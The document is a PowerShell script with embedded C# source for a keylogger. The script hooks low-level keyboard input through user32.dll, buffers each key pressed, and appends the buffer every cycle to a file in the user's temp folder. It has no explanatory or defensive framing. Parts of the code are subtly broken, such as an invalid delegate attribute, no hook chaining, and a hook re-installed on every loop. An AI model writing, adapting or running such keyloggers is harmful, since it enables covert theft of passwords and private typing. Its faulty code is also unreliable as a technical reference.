
$src = @'
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
public static class KL {
  [DllImport("user32.dll", CharSet=CharSet.Auto, SetLastError=true)]
  private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
  [DllImport("user32.dll")] private static extern bool UnhookWindowsHookEx(IntPtr hhk);
  [delegate] public delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
  private static LowLevelKeyboardProc _proc = HookCallback;
  private static IntPtr _hookID = IntPtr.Zero;
  public static System.Text.StringBuilder Buf = new System.Text.StringBuilder();
  private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
    if (nCode >= 0 && wParam == (IntPtr)0x0100) {
      int vk = Marshal.ReadInt32(lParam);
      Buf.Append(((char)vk).ToString());
    }
    return IntPtr.Zero;
  }
  public static void Run() {
    using (Process p = Process.GetCurrentProcess())
      using (ProcessModule m = p.MainModule)
        _hookID = SetWindowsHookEx(13, _proc, m.BaseAddress, 0);
  }
}
'@
Add-Type -TypeDefinition $src
while ($true) {
  [KL]::Run()
  Start-Sleep -Seconds 15
  if ([KL]::Buf.Length -gt 0) {
    Add-Content -Path "$env:TEMP\kl.klq" -Value ([KL]::Buf.ToString())
    [KL]::Buf.Clear() | Out-Null
  } else { Start-Sleep -Seconds 45 }
}
